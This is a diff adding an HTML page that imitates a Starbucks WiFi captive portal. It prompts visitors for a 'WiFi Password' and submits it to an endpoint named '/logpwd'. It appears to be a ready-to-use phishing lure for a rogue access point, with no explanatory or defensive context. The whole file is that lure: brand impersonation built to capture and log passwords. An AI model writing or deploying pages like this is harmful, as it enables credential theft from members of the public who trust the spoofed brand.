@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starbucks WiFi</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 320px; }
+        .logo { font-size: 40px; text-align: center; margin-bottom: 20px; }
+        h2 { color: #00704a; text-align: center; margin-bottom: 5px; }
+        .subtitle { color: #666; text-align: center; margin-bottom: 25px; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #00704a; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #005a3a; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">☕</div>
+        <h2>Starbucks WiFi</h2>
+        <p class="subtitle">Free WiFi for customers</p>
+        <form action="/logpwd" method="POST">
+            <input type="password" name="pwd" placeholder="WiFi Password" required>
+            <button type="submit">Get Connected</button>
+        </form>
+    </div>
+</body>
+</html>
